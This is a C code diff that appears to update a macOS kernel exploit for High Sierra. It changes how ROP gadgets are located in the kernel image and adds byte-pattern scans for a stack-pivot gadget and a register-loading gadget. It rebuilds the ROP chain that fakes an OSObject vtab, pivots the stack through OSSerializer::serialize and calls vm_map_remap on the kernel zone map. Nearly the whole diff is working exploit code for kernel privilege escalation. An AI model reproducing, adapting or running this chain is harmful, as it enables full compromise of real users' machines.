@@ -13,6 +13,8 @@
 #define _ZNK8OSObject13taggedReleaseEPKv OSObject_taggedRelease
 #define _ZNK12OSSerializer9serializeEP11OSSerialize OSSerializer_serialize
 #define _ZN7OSArray13initWithArrayEPKS_j OSArray_initWithArray
+// ...or for general aliasing.
+#define mach_vm_wire_external mach_vm_wire
 
 #define STRINGIFY_EXPAND(s) #s
 
@@ -35,7 +37,7 @@ do \
         char *_gadget = memmem(base, seg->filesize, gad__ ## name, sizeof( gad__ ## name )); \
         if(_gadget) \
         { \
-            rop->name = _gadget - kernel + seg->vmaddr; \
+            rop->name = _gadget - kernel - seg->fileoff + seg->vmaddr; \
             LOG("%-30s: 0x%016llx", #name, rop->name); \
         } \
     } \
@@ -54,17 +56,17 @@ do \
 #define LE32(ptr) (((ptr)[0] | ((ptr)[1] << 8) | ((ptr)[2] << 16) | ((ptr)[3] << 24)))
 #define CALL_OFF(ptr) ((((int64_t)((ptr)[2] | ((ptr)[3] << 8) | ((ptr)[4] << 16)) << 40) >> 32) + 0x100)
 
-//uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret;
-uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
+//uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret; XXX
+//uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
 uint8_t gad__mov_rsp_rsi_call_rdi[]             = { 0x48, 0x89, 0xf4, 0xff, 0xd7 }; // mov rsp, rsi; call rdi;
-uint8_t gad__add_rsp_0x28[]                     = { 0x48, 0x83, 0xc4, 0x28, 0xc3 }; // add rsp, 0x28; ret;
+uint8_t gad__add_rsp_0x20_pop_rbp[]             = { 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3 }; // add rsp, 0x20; pop rbp; ret;
 uint8_t gad__pop_rax[]                          = { 0x58, 0xc3 };                   // pop rax; ret;
 uint8_t gad__pop_rdi[]                          = { 0x5f, 0xc3 };                   // pop rdi; ret;
 uint8_t gad__pop_rsi[]                          = { 0x5e, 0xc3 };                   // pop rsi; ret;
 uint8_t gad__pop_rdx[]                          = { 0x5a, 0xc3 };                   // pop rdx; ret;
 uint8_t gad__pop_rcx[]                          = { 0x59, 0xc3 };                   // pop rcx; ret;
 uint8_t gad__pop_r8_pop_rbp[]                   = { 0x41, 0x58, 0x5d, 0xc3 };       // pop r8; pop rbp; ret;
-uint8_t gad__mov_r9__rbp_0x38__call_rax[]       = { 0x4c, 0x8b, 0x4d, 0xc8, 0xff, 0xd0 }; // mov r9, [rbp - 0x38]; call rax;
+//uint8_t gad__mov_r9__rbp_0x38__call_rax[]       = { 0x4c, 0x8b, 0x4d, 0xc8, 0xff, 0xd0 }; // mov r9, [rbp - 0x38]; call rax; XXX
 uint8_t gad__push_rbp_mov_rax__rdi__pop_rbp[]   = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // push rbp; mov rbp, rsp; mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov_rax__rdi__pop_rbp[]            = { 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov__rdi__rax_pop_rbp[]            = { 0x48, 0x89, 0x07, 0x5d, 0xc3 }; // mov [rdi], rax; pop rbp; ret;
@@ -99,7 +101,6 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(memcpy);
                 SYM(PE_current_console);
                 SYM(vm_map_remap);
-                SYM(mach_vm_wire);
                 SYM(ipc_port_alloc_special);
                 SYM(ipc_port_make_send);
                 SYM(ipc_kobject_set);
@@ -110,6 +111,11 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(realhost);
                 SYM(mac_policy_list);
                 SYM(hibernate_machine_init);
+
+                // High Sierra renames mach_vm_wire to mach_vm_wire_external, so just
+                // search for both and map them to the same variable via a #define.
+                SYM(mach_vm_wire);
+                SYM(mach_vm_wire_external);
             }
             break;
         }
@@ -149,17 +155,17 @@ int rop_gadgets(rop_t *rop, void *k)
             if((seg->initprot & VM_PROT_EXECUTE) != 0)
             {
                 void *base = kernel + seg->fileoff;
-                //GADGET(add__rdi__ecx);
-                GADGET(mov_rdi__rax_8__call__rax_);
+                //GADGET(add__rdi__ecx); XXX
+                //GADGET(mov_rdi__rax_8__call__rax_);
                 GADGET(mov_rsp_rsi_call_rdi);
-                GADGET(add_rsp_0x28);
+                GADGET(add_rsp_0x20_pop_rbp);
                 GADGET(pop_rax);
                 GADGET(pop_rdi);
                 GADGET(pop_rsi);
                 GADGET(pop_rdx);
                 GADGET(pop_rcx);
                 GADGET(pop_r8_pop_rbp);
-                GADGET(mov_r9__rbp_0x38__call_rax);
+                //GADGET(mov_r9__rbp_0x38__call_rax);
                 GADGET(push_rbp_mov_rax__rdi__pop_rbp);
                 GADGET(mov_rax__rdi__pop_rbp);
                 GADGET(mov__rdi__rax_pop_rbp);
@@ -170,46 +176,55 @@ int rop_gadgets(rop_t *rop, void *k)
             }
 
             // _hibernateStats
-            uint64_t addr = rop->hibernate_machine_init;
-            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+            if(rop->_hibernateStats == 0)
             {
-                // Quick & dirty
-                void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
-                char *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8d, 0x3d }, 3); // lea rdi, ...
-                if(load)
+                uint64_t addr = rop->hibernate_machine_init;
+                if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
                 {
-                    rop->_hibernateStats = (load - kernel - seg->fileoff + seg->vmaddr) + 7 +   // rip
-                                           LE32((uint8_t*)&load[3]);                            // offset
-                    LOG("%-30s: 0x%016llx", "_hibernateStats", rop->_hibernateStats);
+                    // Quick & dirty
+                    void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
+                    char *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8d, 0x3d }, 3); // lea rdi, ...
+                    if(load)
+                    {
+                        rop->_hibernateStats = (load - kernel - seg->fileoff + seg->vmaddr) + 7 +   // rip
+                                               LE32((uint8_t*)&load[3]);                            // offset
+                        LOG("%-30s: 0x%016llx", "_hibernateStats", rop->_hibernateStats);
+                    }
                 }
             }
 
             // taggedRelease vtab offset
-            addr = rop->OSObject_vtab;
-            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+            if(rop->taggedRelease_vtab_offset == 0)
             {
-                uint64_t *vtab = (uint64_t*)(kernel + (addr + seg->fileoff - seg->vmaddr));
-                for(size_t i = 2; i < 0x30; ++i)
+                uint64_t addr = rop->OSObject_vtab;
+                if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
                 {
-                    if(vtab[i] == rop->OSObject_taggedRelease)
+                    uint64_t *vtab = (uint64_t*)(kernel + (addr + seg->fileoff - seg->vmaddr));
+                    for(size_t i = 2; i < 0x30; ++i)
                     {
-                        rop->taggedRelease_vtab_offset = (i - 2) * sizeof(*vtab);
-                        LOG("%-30s: 0x%016llx", "taggedRelease vtab offset", rop->taggedRelease_vtab_offset);
-                        break;
+                        if(vtab[i] == rop->OSObject_taggedRelease)
+                        {
+                            rop->taggedRelease_vtab_offset = (i - 2) * sizeof(*vtab);
+                            LOG("%-30s: 0x%016llx", "taggedRelease vtab offset", rop->taggedRelease_vtab_offset);
+                            break;
+                        }
                     }
                 }
             }
 
             // OSArray array buffer member offset
-            addr = rop->OSArray_initWithArray;
-            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+            if(rop->OSArray_array_offset == 0)
             {
-                void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
-                uint8_t *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8b, 0x4e }, 3); // mov rcx, [rsi + ...]
-                if(load)
+                uint64_t addr = rop->OSArray_initWithArray;
+                if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
                 {
-                    rop->OSArray_array_offset = load[3];
-                    LOG("%-30s: 0x%016llx", "OSArray_array_offset", rop->OSArray_array_offset);
+                    void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
+                    uint8_t *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8b, 0x4e }, 3); // mov rcx, [rsi + ...]
+                    if(load)
+                    {
+                        rop->OSArray_array_offset = load[3];
+                        LOG("%-30s: 0x%016llx", "OSArray_array_offset", rop->OSArray_array_offset);
+                    }
                 }
             }
         }
@@ -219,17 +234,17 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(taggedRelease_vtab_offset); // even this can never be 0, since destructor is first in vtab
     ENSURE(OSArray_array_offset);
 
-    //ENSURE(add__rdi__ecx);
-    ENSURE(mov_rdi__rax_8__call__rax_);
+    //ENSURE(add__rdi__ecx); XXX
+    //ENSURE(mov_rdi__rax_8__call__rax_);
     ENSURE(mov_rsp_rsi_call_rdi);
-    ENSURE(add_rsp_0x28);
+    ENSURE(add_rsp_0x20_pop_rbp);
     ENSURE(pop_rax);
     ENSURE(pop_rdi);
     ENSURE(pop_rsi);
     ENSURE(pop_rdx);
     ENSURE(pop_rcx);
     ENSURE(pop_r8_pop_rbp);
-    ENSURE(mov_r9__rbp_0x38__call_rax);
+    //ENSURE(mov_r9__rbp_0x38__call_rax);
     ENSURE(push_rbp_mov_rax__rdi__pop_rbp);
     ENSURE(mov_rax__rdi__pop_rbp);
     ENSURE(mov__rdi__rax_pop_rbp);
@@ -245,8 +260,8 @@ int rop_gadgets(rop_t *rop, void *k)
     }
 
     uint8_t off = (uint8_t)rop->taggedRelease_vtab_offset;
-    uint8_t gad__jmp__vtab1_[]              = { 0xff, 0x60, off };                          // jmp [rax + 0x50];
-    uint8_t gad__mov_rsi_r15_call__vtab0_[] = { 0x4c, 0x89, 0xfe, 0xff, 0x50, off - 8 };    // mov rsi, r15; call [rax + 0x48];
+    uint8_t gad__jmp__vtab1_[]              = { 0xff, 0x60, off };                          // jmp [rax + ...];
+    uint8_t gad__mov_rsi_r15_call__vtab0_[] = { 0x4c, 0x89, 0xfe, 0xff, 0x50, off - 8 };    // mov rsi, r15; call [rax + ...];
 
     FOREACH_CMD(kernel, cmd)
     {
@@ -260,6 +275,62 @@ int rop_gadgets(rop_t *rop, void *k)
                 void *base = kernel + seg->fileoff;
                 GADGET(jmp__vtab1_);
                 GADGET(mov_rsi_r15_call__vtab0_);
+
+                if(rop->stack_pivot == 0)
+                {
+                    for(uint8_t *ptr = base, *end = ptr + seg->filesize; ptr < end; ++ptr)
+                    {
+                        if
+                        (
+                            ptr[0] == 0x48 && ptr[1] == 0x8b && ptr[2] == 0x78 &&           // mov rdi, [rax + ...]
+                            ptr[4] == 0x4c && ptr[5] == 0x89 && (ptr[6] & 0xc7) == 0xc6 &&  // mov rsi, r..
+                            ptr[7] == 0xff && ptr[8] == 0x50                                // call [rax + ...]
+                        )
+                        {
+                            uint8_t loff = ptr[3],
+                                    coff = ptr[9];
+                            // Those are signed, so >=0x80 is negative
+                            if
+                            (
+                                loff < 0x80 && loff < rop->taggedRelease_vtab_offset && loff % sizeof(void*) == 0 &&
+                                coff < 0x80 && coff < rop->taggedRelease_vtab_offset && coff % sizeof(void*) == 0 &&
+                                loff != coff
+                            )
+                            {
+                                rop->stack_pivot = (char*)ptr - kernel - seg->fileoff + seg->vmaddr;
+                                rop->stack_pivot_load_off = loff;
+                                rop->stack_pivot_call_off = coff;
+                                LOG("%-30s: 0x%016llx", "stack_pivot",          rop->stack_pivot);
+                                LOG("%-30s: 0x%016llx", "stack_pivot_load_off", rop->stack_pivot_load_off);
+                                LOG("%-30s: 0x%016llx", "stack_pivot_call_off", rop->stack_pivot_call_off);
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if(rop->mov_r9__rbp_X__call_rax == 0)
+                {
+                    for(uint8_t *ptr = base, *end = ptr + seg->filesize; ptr < end; ++ptr)
+                    {
+                        if
+                        (
+                            ptr[0] == 0x4c && ptr[1] == 0x8b && ptr[2] == 0x4d &&           // mov r9, qword [rbp - ...]
+                            ptr[4] == 0xff && ptr[5] == 0xd0                                // call rax
+                        )
+                        {
+                            int64_t roff = ((int8_t*)ptr)[3];
+                            if(roff % sizeof(void*) == 0)
+                            {
+                                rop->mov_r9__rbp_X__call_rax = (char*)ptr - kernel - seg->fileoff + seg->vmaddr;
+                                rop->mov_r9__rbp_X__off = roff;
+                                LOG("%-30s: 0x%016llx", "mov_r9__rbp_X__call_rax",  rop->mov_r9__rbp_X__call_rax);
+                                LOG("%-30s: 0x%016llx", "mov_r9__rbp_X__off",       rop->mov_r9__rbp_X__off);
+                                break;
+                            }
+                        }
+                    }
+                }
             }
 
             // memcpy gadget
@@ -267,15 +338,15 @@ int rop_gadgets(rop_t *rop, void *k)
             if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
             {
                 void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
-                uint8_t *ret = memchr(func, 0xc3, 0x40); // ret
+                uint8_t *ret = memchr(func, 0xc3, 0x40);    // ret
                 if
                 (
                     ret &&
-                    ret[-1]  == 0x5d && // pop rbp
-                    ret[-2]  == 0xc0 && ret[-3] == 0x31 && // xor eax, eax
-                    ret[-7]  == 0xfb && ret[-8] == 0xe8 && // call ...
+                    ret[-1]  == 0x5d &&                     // pop rbp
+                    ret[-2]  == 0xc0 && ret[-3] == 0x31 &&  // xor eax, eax
+                    ret[-7]  == 0xfb && ret[-8] == 0xe8 &&  // call ...
                     ((char*)&ret[-8] - kernel - seg->fileoff + seg->vmaddr) + CALL_OFF(&ret[-8]) == rop->memcpy &&
-                    ret[-13] == 0xba // mov edx, ...
+                    ret[-13] == 0xba                        // mov edx, ...
                 )
                 {
                     uint32_t imm = LE32(&ret[-12]);
@@ -292,6 +363,8 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(memcpy_gadget);
     ENSURE(jmp__vtab1_);
     ENSURE(mov_rsi_r15_call__vtab0_);
+    ENSURE(stack_pivot);
+    ENSURE(mov_r9__rbp_X__call_rax);
 
     return 0;
 }
@@ -311,19 +384,30 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     uint64_t base_addr      = addr,
              end_addr       = base_addr + 0x1000;
     uint64_t old_rbp_addr   = end_addr - 1 * s,
-             //desc_addr      = end_addr - 2 * s;
              remap_addr     = end_addr - 2 * s,
              dummy_addr     = end_addr - 3 * s;
 
     // Employ our own stack; rax points exactly here:
-    uint64_t after_vtab = addr + rop->taggedRelease_vtab_offset + s;
+    uint64_t *rax = buf;
+    for(size_t i = 0; i < rop->taggedRelease_vtab_offset / s; ++i)
+    {
+        PUSH(0xffffff80facade00 | i);                   // dummy
+    }
+    PUSH(rop->stack_pivot);                             // fake vtab gadget
+
+    uint64_t after_vtab = addr;
+    rax[rop->stack_pivot_load_off / s] = after_vtab - 2 * s; // rdi, first argument to OSSerializer::serialize
+    rax[rop->stack_pivot_call_off / s] = rop->OSSerializer_serialize; // gadget to load stack pivot, executed by fake vtab gadget
+
+#if 0
     PUSH(rop->OSSerializer_serialize);                  // gadget to load stack pivot, executed by fake vtab gadget
     PUSH(after_vtab - 2 * s);                           // rdi, first argument to OSSerializer::serialize
     for(size_t i = 2; i < rop->taggedRelease_vtab_offset / s; ++i)
     {
         PUSH(0xffffff80facade00 | i);                   // dummy
     }
-    PUSH(rop->mov_rdi__rax_8__call__rax_);              // fake vtab gadget
+    //PUSH(rop->mov_rdi__rax_8__call__rax_);              XXX
+#endif
 
     // OSSerializer::serialize will work with these:
     PUSH(rop->pop_rdi);                                 // what to run after stack pivot; need something that jumps over
@@ -419,13 +503,14 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(0);                                            // rcx = mask
     PUSH(rop->pop_r8_pop_rbp);
     PUSH(0x100001);                                     // r8 = VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR
-    PUSH(rop->zone_map + 0x38);                         // we actually need rbp for once
+    PUSH(rop->zone_map - rop->mov_r9__rbp_X__off);      // we actually need rbp for once
     PUSH(rop->pop_rax);
     PUSH(rop->pop_rax);                                 // jumps over the address pushed by "call rax"
-    PUSH(rop->mov_r9__rbp_0x38__call_rax);
+    //PUSH(rop->mov_r9__rbp_0x38__call_rax); XXX
+    PUSH(rop->mov_r9__rbp_X__call_rax);
     // Finally, the call:
     PUSH(rop->vm_map_remap);
-    PUSH(rop->add_rsp_0x28);                            // return address for vm_map_remap
+    PUSH(rop->add_rsp_0x20_pop_rbp);                            // return address for vm_map_remap
     // Arguments on the stack:
     PUSH(0xffffff80000faded);                           // dummy, kernel_task gets written here
     PUSH(0);                                            // false
